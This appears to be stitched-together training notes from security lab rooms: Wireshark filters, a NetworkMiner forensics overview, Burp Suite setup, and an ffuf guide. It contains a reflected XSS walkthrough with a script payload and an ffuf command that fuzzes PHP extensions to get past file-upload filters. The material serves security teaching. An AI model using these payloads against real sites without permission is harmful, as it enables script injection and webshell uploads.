<p>ip.addr == <IP Address> &amp;&amp; tcp.port == <Port Number> &amp;&amp; ip.proto == <Protocol Number></p>
<p>ip.addr &gt;= <Start IP Address> &amp;&amp; ip.addr &lt;= <End IP Address></p>

<p>NetworkMiner is an open-source traffic sniffer, pcap handler and protocol analyser. Developed and still maintained by Netresec.</p>
<p>The official description;</p>
<p>&quot;NetworkMiner is an open source Network Forensic Analysis Tool (NFAT) for Windows (but also works in Linux / Mac OS X / FreeBSD). NetworkMiner can be used as a passive network sniffer/packet capturing tool to detect operating systems, sessions, hostnames, open ports etc. without putting any traffic on the network. NetworkMiner can also parse PCAP files for off-line analysis and to regenerate/reassemble transmitted files and certificates from PCAP files.</p>
<p>NetworkMiner makes it easy to perform advanced Network Traffic Analysis (NTA) by providing extracted artefacts in an intuitive user interface. The way data is presented not only makes the analysis simpler, it also saves valuable time for the analyst or forensic investigator.</p>
<p>NetworkMiner has, since the first release in 2007, become a popular tool among incident response teams as well as law enforcement. NetworkMiner is today used by companies and organizations all over the world.&quot;</p>
<p>For this room, you will be expected to have basic Linux familiarity and Network fundamentals (ports, protocols and traffic data). We suggest completing the &quot;Network Fundamentals&quot; path before starting working in this room.</p>
<p>The room aims to provide a general network forensics overview and work with NetworkMiner to investigate captured traffic.</p>
<p>Note:  VMs attached to this challenge. You don't need SSH or RDP; the room provides a &quot;Split View&quot; feature.
Note: There are two different NetworkMiner versions are available in the attached VM. Use the required version according to the tasks.
Note: Exercise files are located in the folder on the desktop.</p>
<p>Open the tool folder and double click on the .exe file.</p>
<p>Introduction to Network Forensics</p>
<p>Network Forensics is a specific subdomain of the Forensics domain, and it focuses on network traffic investigation. Network Forensics discipline covers the work done to access information transmitted by listening and investigating live and recorded traffic, gathering evidence/artefacts and understanding potential problems. </p>
<p>Briefly, it is the action of recording packets of network traffic and creating investigatable sources and establishing a root–cause analysis of an event. The ultimate goal is to provide sufficient information to detect malicious activities, security breaches, policy/regulation compliance, system health and user behaviour.</p>
<p>The investigation process identifies communicated hosts in terms of time, frequency, protocol, application and data.</p>
<p>The investigation tries to answer the 5W;</p>
<p>Who (Source IP and port)
What (Data/payload)
Where (Destination IP and port)
When (Time and data)
Why (How/What happened)
Note that the network evidence capture and investigation process should be systematic. Having enough data and the right timeline capture for a successful network forensics investigation is crucial.</p>
<p>Network Forensics Use Cases</p>
<p>The most common network forensics use cases are explained below;</p>
<p>Network discovery: Discovering the network to overview connected devices, rogue hosts and network load. </p>
<p>Packets reassembling: Reassembling the packets to investigate the traffic flow. This use case is helpful in unencrypted traffic flows.</p>
<p>Data leakage detection: Reviewing packet transfer rates for each host and destination address helps detect possible data leakage. </p>
<p>Anomaly and malicious activity detection: Reviewing overall network load by focusing on used ports, source and destination addresses, and data helps detect possible malicious activities along with vulnerabilities. This use case covers the correlation of indicators and hypotheses as well.</p>
<p>Policy/Regulation compliance control: Reviewing overall network behaviour helps detect policy/regulation compliance.</p>
<p>Advantages of Network Forensics </p>
<p>General advantages of network forensics are explained below;</p>
<p>Availability of network-based evidence in the wild: Capturing network traffic is collecting evidence, so it is easier than other types of evidence collections such as logs and IOCs.
Ease of data/evidence collection without creating noise: Capturing and working with network traffic is easier than investigating unfiltered events by EDRs, EPPs and log systems. Usually, sniffing doesn't create much noise, logs and alerts. The other thing is that network traffic is not destructible like logs and alerts generated by security systems.<br />
It is hard to destroy the network evidence, as it is the transferred data: Since the evidence is the traffic itself, it is impossible to do anything without creating network noise. Still, it is possible to hide the artefacts by encrypting, tunnelling and manipulating the packets. So, the second fact is the challenge of this advantage. 
Availability of log sources: Logs provide valuable information which helps to correlate the chain of events and support the investigation hypothesis. The majority of the EDRs, EPPs and network devices create logs by default. Having log files is easy if the attacker/threat/malware didn't erase/destroy them.
It is possible to gather evidence for memory and non-residential malicious activities: The malware/threat might reside in the memory to avoid detection. However, the series of commands and connections live in the network. So it is possible to detect non-residential threats with network forensics tools and tactics.</p>
<p>Challenges of Network Forensics</p>
<p>General challenges of the network forensics are explained below;</p>
<p>Deciding what to do: One of the most difficult challenges of network forensics is &quot;Deciding what to do&quot;. There are several purposes of carving networks; SOC, IH/IR and Threat Hunting. Observing, trapping, catching, or stopping an anomalous activity is also possible. 
Sufficient data/evidence collection on the network: One of the advantages of network forensics is &quot;Ease of collecting evidence&quot;. However, the breadth of this concept poses a challenge. There are multiple points to consider in data/evidence collection.</p>
<p>Short data capture: One of the challenges in data/evidence collection. Capturing all network activity is not applicable and operable. So, it is hard always to have the packet captures that covers pre, during and post-event. 
The unavailability of full-packet capture on suspicious events: Continuously capturing, storing and processing full-packets costs time and resources. The inability to have full-packet captures for a long time creates time gaps between captures, resulting in missing a significant part of an event of interest. Sometimes NetFlow captures are used instead of full-packet captures to reduce the weight of having full-packet captures and increase the capture time. Note that full-packet captures provide full packet details and give the opportunity of event reconstruction, while NetFlow provides high-level summary but not data/payload details.
Encrypted traffic: Encrypted data is another challenge of network forensics. In most cases, discovering the contents of the encrypted data is not possible. However, the encrypted data still can provide valuable information for the hypothesis like source and destination address and used services.
GDPR and Privacy concerns in traffic recording: Capturing the traffic is the same as &quot;recording everything on the wire&quot;; therefore, this act should comply with GDPR and business-specific regulations (e.g. HIPAA, PCI DSS and FISMA ).
Nonstandard port usage: One of the popular approaches in network forensics investigations is grabbing the low-hanging fruits in the first investigation step. Looking for commonly used patterns (like known ports and services used in enumeration and exploitation) is known as grabbing the low-hanging fruits. However, sometimes attackers/threats use nonstandard ports and services to avoid detection and bypass security mechanisms. Therefore sometimes, this ends up as a challenge of network forensics.
Time zone issues: Using a common time zone is important for big-scale event investigation. Especially when working with multiple resources over different time zones, usage of different time zones create difficulties in event correlation.
Lack of logs: Network forensics is not limited to investigating the network traffic data. Network devices and event logs are crucial in event correlation and investigation hypotheses. This fact is known by the attackers/threats as well; therefore these logs are often erased by them, in order to make the investigation more difficult.</p>
<p>Sources of Network Forensics Evidence</p>
<p>Capturing proper network traffic requires knowledge and tools. Usually, there is a single chance of gathering the live traffic as evidence. There are multiple evidence resources to gather network forensics data.</p>
<p>TAPS
InLine Devices
SPAN Ports
Hubs
Switches
Routers
DHCP Servers
Name Servers
Authentication Servers
Firewalls
Web Proxies
Central Log Servers
Logs (IDS/IPS, Application, OS, Device)</p>
<p>Primary Purposes of Network Forensics </p>
<p>There are two primary purposes in Network Forensics investigations.</p>
<p>Security Operations (SOC): Daily security monitoring activities on system performance and health, user behaviour, and security issues.
Incident Handling/Response and Threat Hunting: During/Post-incident investigation activities on understanding the reason for the incident, detecting malicious and suspicious activity, and investigating the data flow content.</p>
<p>Investigated Data Types in Network Forensics</p>
<p>There are three main data types investigated in Network Forensics</p>
<p>Live Traffic
Traffic Captures (full packet captures and network flows)
Log Files
NetworkMiner is capable of processing and handling packet pictures and live traffic. Therefore, we will focus on live and captured traffic in this room. Both of these data sources are valuable for forensics investigations. </p>
<p>Traffic investigation actions fall under network forensics's &quot;Traffic Analysis&quot; subdomain. However, the main purpose of the NetworkMiner is to investigate the overall flow/condition of the limited amount of traffic, not for a long in-depth live traffic investigation. Therefore we will focus on how to use NetworkMiner for this purpose. In-depth traffic and packet analysis will be covered in the rooms below;</p>

<p>Anomalies</p>
<p>The anomalies menu shows detected anomalies in the processed pcap. Note that NetworkMiner isn't designated as an IDS. However, developers added some detections for EternalBlue exploit and spoofing attempts.</p>
<p>Version Differences</p>
<p>As always, it wouldn't be surprising to see a feature improvement as the version goes up. Unsurprisingly version upgrades provide stability, security fixes and features. Here the feature part is quite tricky. Feature upgrades can represent implementing new features and updating the existing feature (optimisation, alteration or operation mode modification). You can always check the changelog here.</p>
<p>Since there are some significant differences between the versions, the given VM has both of the major versions (v1.6 and v2.7).</p>
<p>Of course, as the program version increases, it is expected to increase feature increase and scope. Here are the significant differences between versions 1.6 and 2.7. Here are the differences;</p>
<p>Mac Address Processing</p>
<p>NetworkMiner versions after version 2 can process MAC address specific correlation as shown in the picture below. This option will help you identify if there is a MAC Address conflict. This feature is not available before version 2.</p>
<p>Sent/Received Packet Processing</p>
<p>NetwrokMiner versions up to version 1.6. can handle packets in much detail. These options will help you investigate the sent/received
packets in a more detailed format. This feature is not available after version 1.6.</p>
<p>Frame Processing</p>
<p>NetworkMiner versions up to version 1.6. can handle frames. This option provides the number of frames and essential details about the frames. This feature is not available after version 1.6.</p>
<p>Parameter Processing</p>
<p>NetworkMiner versions after version 2 can handle parameters in a much more extensive form. Therefore version 1.6.xx catches fewer parameters than version 2.</p>
<p>Cleartext Processing</p>
<p>NetworkMiner versions up to version 1.6. can handle cleartext data. This option provides all extracted cleartext data in a single tab; it is beneficial to investigate cleartext data about the traffic data. However, it is impossible to match the cleartext data and packets. This feature is not available after version 1.6.</p>

<p>Welcome to Burp Suite Basics!</p>
<p>This particular room aims to understand the basics of the Burp Suite web application security testing framework. Our focus will revolve around the following key aspects:</p>
<p>A thorough introduction to Burp Suite.
A comprehensive overview of the various tools available within the framework.
Detailed guidance on the process of installing Burp Suite on your system.
Navigating and configuring Burp Suite.
We will also introduce the core of the Burp Suite framework, which is the Burp Proxy. It is important to note that this room primarily serves as a foundational resource for acquiring knowledge about Burp Suite. Subsequent rooms in the Burp module will adopt a more practical approach. Thus, this room will contain a greater emphasis on theoretical content. If you have not yet utilised Burp Suite, it is recommended to carefully read the provided information and actively engage with the tool. Experimentation is essential for grasping the fundamentals of this framework. Combining the information presented here with hands-on exploration will establish a strong foundation for utilising the framework. This will significantly assist you in future rooms.</p>
<p>In essence, Burp Suite is a Java-based framework designed to serve as a comprehensive solution for conducting web application penetration testing. It has become the industry standard tool for hands-on security assessments of web and mobile applications, including those that rely on application programming interfaces (APIs).</p>
<p>Simply put, Burp Suite captures and enables manipulation of all the HTTP/HTTPS traffic between a browser and a web server. This fundamental capability forms the backbone of the framework. By intercepting requests, users have the flexibility to route them to various components within the Burp Suite framework, which we will explore in upcoming sections. The ability to intercept, view, and modify web requests before they reach the target server or even manipulate responses before they are received by our browser makes Burp Suite an invaluable tool for manual web application testing.</p>
<p>Burp Suite is available in different editions. For our purposes, we will focus on the Burp Suite Community Edition, which is freely accessible for non-commercial use within legal boundaries. However, it's worth noting that Burp Suite also offers Professional and Enterprise editions, which come with advanced features and require licensing:</p>
<p>Burp Suite Professional is an unrestricted version of Burp Suite Community. It comes with features such as:</p>
<p>An automated vulnerability scanner.
A fuzzer/brute-forcer that isn't rate limited.
Saving projects for future use and report generation.
A built-in API to allow integration with other tools.
Unrestricted access to add new extensions for greater functionality.
Access to the Burp Suite Collaborator (effectively providing a unique request catcher self-hosted or running on a Portswigger-owned server).</p>
<p>In short, Burp Suite Professional is a highly potent tool, making it a preferred choice for professionals in the field.</p>
<p>Burp Suite Enterprise, in contrast to the community and professional editions, is primarily utilized for continuous scanning. It features an automated scanner that periodically scans web applications for vulnerabilities, similar to how tools like Nessus perform automated infrastructure scanning. Unlike the other editions, which allow manual attacks from a local machine, Burp Suite Enterprise resides on a server and constantly scans the target web applications for potential vulnerabilities.</p>
<p>Preview of Burp Suite Enterprise</p>
<p>Due to requiring a license for the Professional and Enterprise editions, we will focus on the core feature set provided by the Burp Suite Community Edition.</p>
<p>Note: The provided demonstrations utilize Burp Suite for Windows. However, the functionality remains consistent with the version installed on the AttackBox.</p>
<p>Although Burp Suite Community offers a more limited feature set compared to the Professional edition, it still provides an impressive array of tools that are highly valuable for web application testing. Let's explore some of the key features:</p>
<p>Proxy: The Burp Proxy is the most renowned aspect of Burp Suite. It enables interception and modification of requests and responses while interacting with web applications.
Repeater: Another well-known feature. Repeater allows for capturing, modifying, and resending the same request multiple times. This functionality is particularly useful when crafting payloads through trial and error (e.g., in SQLi - Structured Query Language Injection) or testing the functionality of an endpoint for vulnerabilities.
Intruder: Despite rate limitations in Burp Suite Community, Intruder allows for spraying endpoints with requests. It is commonly utilized for brute-force attacks or fuzzing endpoints.
Decoder: Decoder offers a valuable service for data transformation. It can decode captured information or encode payloads before sending them to the target. While alternative services exist for this purpose, leveraging Decoder within Burp Suite can be highly efficient.
Comparer: As the name suggests, Comparer enables the comparison of two pieces of data at either the word or byte level. While not exclusive to Burp Suite, the ability to send potentially large data segments directly to a comparison tool with a single keyboard shortcut significantly accelerates the process.
Sequencer: Sequencer is typically employed when assessing the randomness of tokens, such as session cookie values or other supposedly randomly generated data. If the algorithm used for generating these values lacks secure randomness, it can expose avenues for devastating attacks.
Beyond the built-in features, the Java codebase of Burp Suite facilitates the development of extensions to enhance the framework's functionality. These extensions can be written in Java, Python (using the Java Jython interpreter), or Ruby (using the Java JRuby interpreter). The Burp Suite Extender module allows for quick and easy loading of extensions into the framework, while the marketplace, known as the BApp Store, enables downloading of third-party modules. While certain extensions may require a professional license for integration, there are still a considerable number of extensions available for Burp Community. For instance, the Logger++ module can extend the built-in logging functionality of Burp Suite.</p>
<p>Burp Suite is one of those tools that is very useful to have around, whether for web or mobile application assessments, pentesting, bug bounty hunting, or even debugging features in web app development. Here's a guide on installing Burp Suite on different platforms:</p>
<p>Note: If you use the AttackBox, Burp Suite is already installed, so you can skip this step.</p>
<p>Downloads</p>
<p>To download the latest version of Burp Suite for other systems, you may click this button to go to their download page.</p>
<p>Kali Linux: Burp Suite comes pre-installed with Kali Linux. In case it is missing on your Kali installation, you can easily install it from the Kali apt repositories.</p>
<p>Linux, macOS, and Windows: For other operating systems, PortSwigger provides dedicated installers for Burp Suite Community and Burp Suite Professional on the Burp Suite downloads page. Choose your operating system from the dropdown menu and select Burp Suite Community Edition. Then, click the Download button to initiate the download.</p>
<p>Installation</p>
<p>Install Burp Suite using the appropriate method for your operating system. On Windows, run the executable file, while on Linux, execute the script from the terminal (with or without sudo). If you choose not to use sudo during installation on Linux, Burp Suite will be installed in your home directory at ~/BurpSuiteCommunity/BurpSuiteCommunity and will not be added to your PATH.</p>
<p>The installation wizard provides clear instructions, and it is generally safe to accept the default settings. However, it is always recommended to review the installer carefully.</p>
<p>With Burp Suite successfully installed, you can now launch the application. In the next task, we will explore the initial setup and configuration.</p>
<p>You may use the pre-installed Burp Suite Community Edition in our AttackBox. To launch the AttackBox, click the Start AttackBox button at the top of this page.</p>
<p>Once you launch Burp Suite and accept the terms and conditions, you will be prompted to select a project type. In Burp Suite Community, the options are limited, and you can simply click Next to proceed.</p>
<p>The next window allows you to choose the configuration for Burp Suite. It is generally recommended to keep the default settings, which are suitable for most situations. Click Start Burp to open the main Burp Suite interface.</p>
<p>Upon opening Burp Suite for the first time, you might encounter a screen with training options. It is highly recommended to go through these training materials when you have the time.</p>
<p>If you don't see the training screen (or in subsequent sessions), you will be presented with the Burp Dashboard, which may seem overwhelming at first. However, it will soon become familiar.</p>
<p>The Burp Dashboard is divided into four quadrants, as labelled in counter-clockwise order starting from the top left:</p>
<p>Showing the different quadrants in the dashboard</p>
<p>Tasks: The Tasks menu allows you to define background tasks that Burp Suite will perform while you use the application. In Burp Suite Community, the default “Live Passive Crawl” task, which automatically logs the pages visited, is sufficient for our purposes in this module. Burp Suite Professional offers additional features like on-demand scans.</p>
<p>Event log: The Event log provides information about the actions performed by Burp Suite, such as starting the proxy, as well as details about connections made through Burp.</p>
<p>Issue Activity: This section is specific to Burp Suite Professional. It displays the vulnerabilities identified by the automated scanner, ranked by severity and filterable based on the certainty of the vulnerability.</p>
<p>Advisory: The Advisory section provides more detailed information about the identified vulnerabilities, including references and suggested remediations. This information can be exported into a report. In Burp Suite Community, this section may not show any vulnerabilities.</p>
<p>Throughout the various tabs and windows of Burp Suite, you will notice question mark icons (question mark icon).</p>
<p>Clicking on these icons opens a new window with helpful information specific to that section. These help icons are invaluable when you need assistance or clarification on a particular feature, so make sure to utilise them effectively.</p>
<p>Help menu when the question mark logo is clicked</p>
<p>By exploring the different tabs and functionalities of Burp Suite, you will gradually become familiar with its capabilities.</p>
<p>In Burp Suite, the default navigation is primarily done through the top menu bars, which allow you to switch between modules and access various sub-tabs within each module. The sub-tabs appear in a second menu bar directly below the main menu bar.</p>
<p>Here's how the navigation works:</p>
<p>Module Selection: The top row of the menu bar displays the available modules in Burp Suite. You can click on each module to switch between them. For example, the Burp Proxy module is selected in the image below.</p>
<p>Sub-Tabs: If a selected module has multiple sub-tabs, they can be accessed through the second menu bar that appears directly below the main menu bar. These sub-tabs often contain module-specific settings and options. For example, in the image above, the Proxy Intercept sub-tab is selected within the Burp Proxy module.</p>
<p>Detaching Tabs: If you prefer to view multiple tabs separately, you can detach them into separate windows. To do this, go to the Window option in the application menu above the Module Selection bar. From there, choose the &quot;Detach&quot; option, and the selected tab will open in a separate window. The detached tabs can be reattached using the same method.</p>
<p>Burp Suite also provides keyboard shortcuts for quick navigation to key tabs. By default, the following shortcuts are available:</p>
<p>Shortcut	Tab
Ctrl + Shift + D	Dashboard
Ctrl + Shift + T	Target tab
Ctrl + Shift + P	Proxy tab
Ctrl + Shift + I	Intruder tab
Ctrl + Shift + R	Repeater tab</p>
<p>Before diving into the Burp Proxy, let's explore the available options for configuring Burp Suite. There are two types of settings: Global settings (also known as User settings) and Project settings.</p>
<p>Global Settings: These settings affect the entire Burp Suite installation and are applied every time you start the application. They provide a baseline configuration for your Burp Suite environment.</p>
<p>Project Settings: These settings are specific to the current project and apply only during the session. However, please note that Burp Suite Community Edition does not support saving projects, so any project-specific options will be lost when you close Burp.</p>
<p>To access the settings, click on the Settings button in the top navigation bar. This will open a separate settings window.</p>
<p>Settings button to open the separate settings window</p>
<p>Below is the image showing the separate settings window.</p>
<p>Separate settings window</p>
<p>In the Settings window, you will find a menu on the left-hand side. This menu allows you to switch between different types of settings, including:</p>
<p>Search: Enables searching for specific settings using keywords.
Type filter: Filters the settings for User and Project options.
User settings: Shows settings that affect the entire Burp Suite installation.
Project settings: Displays settings specific to the current project.
Categories: Allows selecting settings by category.
Project settings button</p>
<p>It's worth noting that many tools within Burp Suite provide shortcuts to specific categories of settings. For example, the Proxy module includes a Proxy settings button that opens the settings window directly to the relevant proxy section.</p>

relevant proxy section</p>
<p>The search feature on the settings page is a valuable addition, allowing you to quickly search for settings using keywords.</p>
<p>Take some time to familiarise yourself with the range of configurable options in Burp Suite. Once you are comfortable, you can proceed with the exercises related to configuring Burp Suite settings.</p>
<p>The Burp Proxy is a fundamental and crucial tool within Burp Suite. It enables the capture of requests and responses between the user and the target web server. This intercepted traffic can be manipulated, sent to other tools for further processing, or explicitly allowed to continue to its destination.</p>
<p>Key Points to Understand About the Burp Proxy</p>
<p>Intercepting Requests: When requests are made through the Burp Proxy, they are intercepted and held back from reaching the target server. The requests appear in the Proxy tab, allowing for further actions such as forwarding, dropping, editing, or sending them to other Burp modules. To disable the intercept and allow requests to pass through the proxy without interruption, click the Intercept is on button.</p>
<p>Taking Control: The ability to intercept requests empowers testers to gain complete control over web traffic, making it invaluable for testing web applications.</p>
<p>Capture and Logging: Burp Suite captures and logs requests made through the proxy by default, even when the interception is turned off. This logging functionality can be helpful for later analysis and review of prior requests.</p>
<p>WebSocket Support: Burp Suite also captures and logs WebSocket communication, providing additional assistance when analysing web applications.</p>
<p>Logs and History: The captured requests can be viewed in the HTTP history and WebSockets history sub-tabs, allowing for retrospective analysis and sending the requests to other Burp modules as needed.</p>
<p>Proxy-specific options can be accessed by clicking the Proxy settings button. These options provide extensive control over the Proxy’s behaviour and functionality. Familiarise yourself with these options to optimize your Burp Proxy usage.</p>
<p>Some Notable Features in the Proxy Settings</p>
<p>Response Interception: By default, the proxy does not intercept server responses unless explicitly requested on a per-request basis. The &quot;Intercept responses based on the following rules&quot; checkbox, along with the defined rules, allows for a more flexible response interception.</p>
<p>Match and Replace: The &quot;Match and Replace&quot; section in the Proxy settings enables the use of regular expressions (regex) to modify incoming and outgoing requests. This feature allows for dynamic changes, such as modifying the user agent or manipulating cookies.</p>
<p>Take the time to explore and experiment with the Proxy options, as this will enhance your understanding and proficiency with the tool.</p>
<p>Start the machine by clicking the Start Machine button at the upper right corner of this task.</p>
<p>To use the Burp Suite Proxy, we need to configure our local web browser to redirect traffic through Burp Suite. In this task, we will focus on configuring the proxy using the FoxyProxy extension in Firefox.</p>
<p>Please note that the instructions provided are specific to Firefox. If you are using a different browser, you may need to find alternative methods or use the TryHackMe AttackBox.</p>
<p>Here are the steps to configure the Burp Suite Proxy with FoxyProxy:</p>
<p>Install FoxyProxy: Download and install the FoxyProxy Basic extension.</p>
<p>Note: FoxyProxy is already installed on the AttackBox.</p>
<p>Access FoxyProxy Options: Once installed, a button will appear at the top right of the Firefox browser. Click on the FoxyProxy button to access the FoxyProxy options pop-up.</p>
<p>Create Burp Proxy Configuration: In the FoxyProxy options pop-up, click the Options button. This will open a new browser tab with the FoxyProxy configurations. Click the Add button to create a new proxy configuration.</p>
<p>Add Proxy Details: On the &quot;Add Proxy&quot; page, fill in the following values:</p>
<p>Title: Burp (or any preferred name)
Proxy IP: 127.0.0.1
Port: 8080</p>
<p>Save Configuration: Click Save to save the Burp Proxy configuration.</p>
<p>Activate Proxy Configuration: Click on the FoxyProxy icon at the top-right of the Firefox browser and select the Burp configuration. This will redirect your browser traffic through 127.0.0.1:8080. Note that Burp Suite must be running for your browser to make requests when this configuration is activated.</p>
<p>Enable Proxy Intercept in Burp Suite: Switch to Burp Suite and ensure that Intercept is turned on in the Proxy tab.</p>
<p>Test the Proxy: Open Firefox and try accessing a website, such as the homepage for http://10.10.236.169/. Your browser will hang, and the proxy will populate with the HTTP request. Congratulations, you have successfully intercepted your first request!</p>
<p>Remember the following:</p>
<p>When the proxy configuration is active, and the intercept is switched on in Burp Suite, your browser will hang whenever you make a request.
Be cautious not to leave the intercept switched on unintentionally, as it can prevent your browser from making any requests.
Right-clicking on a request in Burp Suite allows you to perform various actions, such as forwarding, dropping, sending to other tools, or selecting options from the right-click menu.
Take note of these details as you begin using the Burp Suite Proxy.</p>
<p>Note: Consider closing the other tabs in the AttackBox browser before enabling interception, as you will receive some WebSocket requests instead of request from the target VM.</p>
<p>If the previous tasks seemed overly complex, rest assured, this topic will be a lot simpler.</p>
<p>In addition to modifying our regular web browser to work with the proxy, Burp Suite also includes a built-in Chromium browser that is pre-configured to use the proxy without any of the modifications we just had to do.</p>
<p>To start the Burp Browser, click the Open Browser button in the proxy tab. A Chromium window will pop up, and any requests made in this browser will go through the proxy.</p>
<p>Note: There are many settings related to the Burp Browser in the project options and user options settings. Make sure to explore and customise them as needed.</p>
<p>However, if you are running Burp Suite on Linux as the root user (as is the case with the AttackBox), you may encounter an error preventing the Burp Browser from starting due to the inability to create a sandbox environment.</p>
<p>There are two simple solutions to this:</p>
<p>Smart option: Create a new user and run Burp Suite under a low-privilege account to allow the Burp Browser to run without issues.
Easy option: Go to Settings -&gt; Tools -&gt; Burp's browser and check the Allow Burp's browser to run without a sandbox option. Enabling this option will allow the browser to start without a sandbox. However, please be aware that this option is disabled by default for security reasons. If you choose to enable it, exercise caution, as compromising the browser could grant an attacker access to your entire machine. In the training environment of the AttackBox, this is unlikely to be a significant issue, but use it responsibly.</p>
<p>Finally, we come to one of the most important aspects of using the Burp Proxy: Scoping.</p>
<p>Capturing and logging all of the traffic can quickly become overwhelming and inconvenient, especially when we only want to focus on specific web applications. This is where scoping comes in.</p>
<p>By setting a scope for the project, we can define what gets proxied and logged in Burp Suite. We can restrict Burp Suite to target only the specific web application(s) we want to test. The easiest way to do this is by switching to the Target tab, right-clicking on our target from the list on the left, and selecting Add To Scope. Burp will then prompt us to choose whether we want to stop logging anything that is not in scope, and in most cases, we want to select yes.</p>
<p>To check our scope, we can switch to the Scope settings sub-tab within the Target tab.</p>
<p>The Scope settings window allows us to control our target scope by including or excluding domains/IPs. This section is powerful and worth spending time getting familiar with.</p>
<p>However, even if we disabled logging for out-of-scope traffic, the proxy will still intercept everything. To prevent this, we need to go to the Proxy settings sub-tab and select And URL Is in target scope from the &quot;Intercept Client Requests&quot; section.</p>
<p>Enabling this option ensures that the proxy completely ignores any traffic that is not within the defined scope, resulting in a cleaner traffic view in Burp Suite.</p>
<p>Note: The AttackBox is already configured to solve the problem posed in this task. If you use the AttackBox and don't wish to read through the information here, you can skip to the next task.</p>
<p>When intercepting HTTP traffic, we may encounter an issue when navigating to sites with TLS enabled. For example, when accessing a site like https://google.com/, we may receive an error indicating that the PortSwigger Certificate Authority (CA) is not authorised to secure the connection. This happens because the browser does not trust the certificate presented by Burp Suite.</p>
<p>To overcome this issue, we can manually add the PortSwigger CA certificate to our browser's list of trusted certificate authorities. Here's how to do it:</p>
<p>Download the CA Certificate: With the Burp Proxy activated, navigate to http://burp/cert. This will download a file called cacert.der. Save this file somewhere on your machine.</p>
<p>Access Firefox Certificate Settings: Type about:preferences into your Firefox URL bar and press Enter. This will take you to the Firefox settings page. Search the page for &quot;certificates&quot; and click on the View Certificates button.</p>
<p>Import the CA Certificate: In the Certificate Manager window, click on the Import button. Select the cacert.der file that you downloaded in the previous step.</p>
<p>Set Trust for the CA Certificate: In the subsequent window that appears, check the box that says &quot;Trust this CA to identify websites&quot; and click OK.</p>
<p>By completing these steps, we have added the PortSwigger CA certificate to our list of trusted certificate authorities. Now, we should be able to visit any TLS-enabled site without encountering the certificate error.</p>
<p>You can watch the following video for a visual demonstration of the full certificate import process:</p>
<p>By following these instructions, you can ensure that your browser trusts the PortSwigger CA certificate and securely communicates with TLS-enabled websites through the Burp Suite Proxy.</p>
<p>Having looked at how to set up and configure our proxy, let's go through a simplified real-world example.</p>
<p>We will start by taking a look at the support form at http://10.10.47.227/ticket/:</p>
<p>In a real-world web app pentest, we would test this for a variety of things, one of which would be Cross-Site Scripting (or XSS). If you have not yet encountered XSS, it can be thought of as injecting a client-side script (usually in Javascript) into a webpage in such a way that it executes. There are various kinds of XSS – the type that we are using here is referred to as &quot;Reflected&quot; XSS, as it only affects the person making the web request.</p>
<p>Walkthrough</p>
<p>Try typing: <script>alert(&quot;Succ3ssful XSS&quot;)</script>, into the &quot;Contact Email&quot; field. You should find that there is a client-side filter in place which prevents you from adding any special characters that aren't allowed in email addresses:</p>
<p>GIF demonstrating the client-side filter</p>
<p>Fortunately for us, client-side filters are absurdly easy to bypass. There are a variety of ways we could disable the script or just prevent it from loading in the first place.</p>
<p>Let's focus on simply bypassing the filter for now.</p>
<p>First, make sure that your Burp Proxy is active and that intercept is on.</p>
<p>Now, enter some legitimate data into the support form. For example: &quot;pentester@example.thm&quot; as an email address, and &quot;Test Attack&quot; as a query.</p>
<p>Submit the form — the request should be intercepted by the proxy.</p>
<p>With the request captured in the proxy, we can now change the email field to be our very simple payload from above: <script>alert(&quot;Succ3ssful XSS&quot;)</script>. After pasting in the payload, we need to select it, then URL encode it with the Ctrl + U shortcut to make it safe to send. This process is shown in the GIF below:</p>
<p>GIF demonstrating the explained process of intercepting and URL encoding the pasted payload</p>
<p>Finally, press the &quot;Forward&quot; button to send the request.</p>
<p>You should find an alert box from the site indicating a successful XSS attack!</p>
<p>Screenshot showing the successful XSS attack</p>

<p><strong>I. Setting Up the Target:</strong></p>
<ol>
<li><strong>Identify the target URL:</strong> Locate the web page containing the file upload form.</li>
<li><strong>Analyze the form:</strong> Inspect the HTML code to find the following elements:</li>
</ol>
<ul>
<li>The form's action attribute (specifies where the form data is submitted).</li>
<li>The name of the file input field.</li>
<li>Any restrictions or validations on file types.</li>
</ul>
<p><strong>II. Crafting the FUZZ Payload:</strong></p>
<ol>
<li><strong>Create the payload file:</strong></li>
</ol>
<ul>
<li>Create a text file (e.g., <code>payloads.txt</code>) containing the file extensions you want to try, each on a separate line. For example:</li>
</ul>
<pre><code>php
php3
phtml
inc
</code></pre>
<ol start="2">
<li><strong>Utilize ffuf commands:</strong></li>
</ol>
<ul>
<li>Replace the placeholders below with your specific information:</li>
<li><code>TARGET_URL</code>: The action URL of the file upload form.</li>
<li><code>FILE_FIELD</code>: The name of the file input field.</li>
<li><code>PAYLOADS_FILE</code>: The path to your payloads file (<code>payloads.txt</code>).</li>
</ul>
<p><strong>Command:</strong></p>
<pre><code>ffuf -u TARGET_URL -w PAYLOADS_FILE -H \&quot;Content-Type: multipart/form-data; boundary=--------------------------168372996359978745573820585509\&quot; -X POST -d \&quot;--------------------------168372996359978745573820585509\r\nContent-Disposition: form-data; name=\\&quot;FILE_FIELD\\&quot;; filename=\\&quot;payload.FUZZ\\&quot;\r\nContent-Type: application/x-php\r\n\r\nFUZZ\&quot; -mc 200
</code></pre>
<p><strong>Explanation:</strong></p>
<ul>
<li><code>-u</code>: Specifies the target URL.</li>
<li><code>-w</code>: Provides the payloads list file.</li>
<li><code>-H</code>: Sets the Content-Type header for multipart/form-data with a boundary string.</li>
<li><code>-X</code>: Sets the request method to POST for uploading files.</li>
<li><code>-d</code>: Defines the request body with the appropriate HTML structure, form field name (<code>FILE_FIELD</code>), placeholder for the extension (<code>FUZZ</code>), and file type (<code>application/x-php</code>).</li>
<li><code>-mc 200</code>: Filters results to display only responses with HTTP code 200 (potentially successful uploads).</li>
</ul>
<p><strong>III. Running the Command and Analyzing Results:</strong></p>
<ol>
<li>Execute the <code>ffuf</code> command from your terminal.</li>
<li>ffuf will start sending requests, testing different PHP extensions from the provided payloads file.</li>
<li>Monitor the output for responses with HTTP code 200 and check the server's responses to identify potential vulnerabilities related to the extension tested.</li>
</ol>
<p><strong>IV. Important Notes:</strong></p>
<ul>
<li>This example is for demonstration purposes only. Utilize ffuf responsibly and avoid any illegal activities.</li>
<li>Ensure you have permission to test the target website before initiating any requests.</li>
<li>Adapt the command to fit the specific target form and validation rules.</li>
<li>Modify the file types and payloads based on the form's expected behavior.</li>
</ul>

<p>This information is for educational purposes only. I am not responsible for any consequences resulting from misuse or illegal activities using ffuf. Always exercise ethical judgment and follow all applicable laws.</p>
